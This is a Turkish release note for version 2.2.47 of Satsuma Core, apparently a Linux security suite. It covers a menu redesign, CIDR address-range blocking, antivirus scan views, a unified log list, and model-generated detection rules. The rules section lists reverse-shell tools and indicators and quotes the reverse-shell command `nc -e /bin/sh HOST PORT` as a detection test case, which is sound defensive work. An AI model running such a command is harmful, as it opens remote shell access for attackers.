# Satsuma Core 2.2.47 (2026-11-18)

Durum: kaynak adayı; RPM GitHub Actions'ta Fedora 44 içinde derlenir. İmzasız.

## Eski tasarım kaldırıldı; her menü yeni tasarımda

- "Uzman görünümü", eski Yönetim ve Genel bakış sayfaları yok. Önceki her sayfa
  aşağıdaki dokuz bölümden birinin sekmesidir (Ctrl+1…9):
  - **Durum**
  - **Olanlar**: Akış, Bulgular, Durdurulan programlar, Satsuma'nın işlemleri,
    İnceleme, Araştırma stüdyosu.
  - **Antivirüs**: Taramalar ve karantina, Bellek savunması, Dosya bütünlüğü.
  - **Güvenlik duvarı**: Ayarlar (gelen/giden bağlantılar, internete çıkan
    portlar, DNS filtresi, OTX), Engeller, Engel geçmişi, Ağ bulguları, Cihazlar,
    DNS sorguları, Trafik analizi, Tehdit istihbaratı, VPN ve proxy.
  - **Uygulama denetimi**: Uygulama izinleri (aç/kapat, bekleyen kararlar, süre,
    kayıtlı kurallar, OpenSnitch durumu), Onay bekleyen programlar.
  - **Koruma**: zararlı programın durdurulması, dosya taraması, Kurallar.
  - **Sağlık**: Genel, Servisler (başlat/yeniden başlat/durdur), Bileşenler,
    **Açılış, TPM ve paketler** (TPM denetimi buradadır), Ayrıntılı kontroller.
  - **Kayıtlar**: Tüm kayıtlar, Türlere göre, Olay geçmişi, Sistem denetimi,
    Hatalar, Ham veritabanı.
  - **Ayarlar**: Genel (modem onayı ve tabloları, WireGuard), Kurulum ve hesap.
- Eski Yönetim sayfasındaki her işlem yeni yerinde: güvenlik taraması, servis
  denetimi, aygıt envanteri, VPN bağlantısını kesme, özel portlar, IP izinleri
  ve engel kaldırma, bakım işinin sonucu.

## Adres aralığı engelleme (ör. 192.168.0.0/16)

Güvenlik duvarı → Engeller'de tek adres ya da CIDR aralığı engellenir. Engeller
Satsuma'nın kendi `satsuma_netblock` tablosundadır (yalnızca drop kuralları,
giriş/çıkış/yönlendirme), açılışta geri yüklenir. Varsayılan ağ geçidinizi ya
da bu bilgisayarın kendi adresini kapsayan aralık, /8'den geniş aralıklar,
IPv6 ve Satsuma'nın kendi DNS adresleri reddedilir. Engel kaldırmak parolayı
yeniden sorar.

## Antivirüs taramaları görünür

Tarama sayfasındaki yedi büyük düğme tabloyu tek satıra sıkıştırıyordu. Artık:
üç motor kartı (ClamAV için taranan dosya sayısı, taranan veri, süre ve bulunan
dosyalar), tek satırlık işlem çubuğu, motor süzgeci, yüksek tablo ve seçili
kaydın bulduğu dosyalar ile imzaları. ClamAV özeti her taramada saklanır; eski
kayıtlar çıktı özetinden okunur.

## Tüm kayıtlar tek, okunur listede

Kayıtlar → Tüm kayıtlar iki veritabanındaki her kaydı en yenisi üstte, tek
cümleyle gösterir: önemi (Hata, Önemli, Uyarı, Başarılı, Bilgi), türü, ne
olduğu, ayrıntısı. Art arda tekrarlanan kayıt tek satırda "×11" olur. Seçilen
kaydın türü nedir, neden tutulur, kaynağı ve maskeli ham hâli görünür. Görünüm
(Önemli, yalnızca uyarı ve hatalar, Koruma, Ağ, Sağlık, Ham olaylar), dönem,
arama ve "Daha eski kayıtlar" vardır. Ham telemetri yalnızca istenirse gelir.

## DeepSeek kuralları

- Ters kabuk kuralları hiç onaylanmıyordu: model bütün araçları (bash -i, nc -e,
  python -c…) ve bütün göstergeleri (/dev/tcp/, socket…) tek kurala yazıyordu.
  base_match anahtarları birlikte (VE) sağlanmalı olduğundan `nc -e /bin/sh
  HOST PORT` kendi olumlu örneğinde yakalanmıyordu. İstem artık bir kuralın tek
  bir varyantı kapsamasını ister ve varyantları sayar; test olayları çekirdeğin
  gördüğü argv biçimindedir (`bash -c '…'`).
- Kural, operatöre gelmeden yalıtılmış motorda test edilir. Kendi testini
  geçmeyen ya da var olan kuralı tekrarlayan yanıt, Satsuma'nın gerekçesi ve
  başarısız sentetik olayla bir kez daha istenir (iki istek saatlik sınırdan
  düşülür). Ana makine verisi gönderilmez.
- Bir süre sonra hep aynı kural geliyordu (aynı istem, düşük sıcaklık). Bu
  tehdit için kuyruktaki, reddedilen ve etkin kuralların eşleşme koşulları
  isteme eklenir; model başka bir varyant yazar.
